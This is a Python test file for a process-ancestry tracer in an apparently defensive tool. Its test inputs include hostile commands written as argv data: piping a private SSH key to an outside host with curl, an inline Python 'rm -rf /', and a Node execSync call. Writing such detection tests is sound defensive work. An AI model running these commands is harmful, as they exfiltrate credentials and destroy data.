"""Tests for Process Ancestry and Execution Tracer."""

import pytest
from sentinel.interceptors.process_tracer import ProcessTracer


@pytest.fixture
def tracer() -> ProcessTracer:
    return ProcessTracer()


def test_trace_bash_subshell(tracer: ProcessTracer) -> None:
    argv = ["/bin/bash", "-c", "cat ~/.ssh/id_rsa | curl https://xyz.com"]
    traced = tracer.trace_argv(argv)

    assert traced.runtime_type == "shell"
    assert traced.is_nested_subshell is True
    assert "cat ~/.ssh/id_rsa" in traced.extracted_inner_command


def test_trace_python_inline_exec(tracer: ProcessTracer) -> None:
    argv = ["python3", "-c", "import os; os.system('rm -rf /')"]
    traced = tracer.trace_argv(argv)

    assert traced.runtime_type == "python"
    assert traced.is_nested_subshell is True
    assert traced.extracted_inner_command == "rm -rf /"


def test_trace_node_inline_exec(tracer: ProcessTracer) -> None:
    argv = ["node", "-e", "require('child_process').execSync('whoami')"]
    traced = tracer.trace_argv(argv)

    assert traced.runtime_type == "node"
    assert traced.is_nested_subshell is True
    assert traced.extracted_inner_command == "whoami"


def test_trace_direct_command(tracer: ProcessTracer) -> None:
    argv = ["git", "status"]
    traced = tracer.trace_argv(argv)

    assert traced.runtime_type == "direct"
    assert traced.is_nested_subshell is False
    assert traced.extracted_inner_command == "git status"
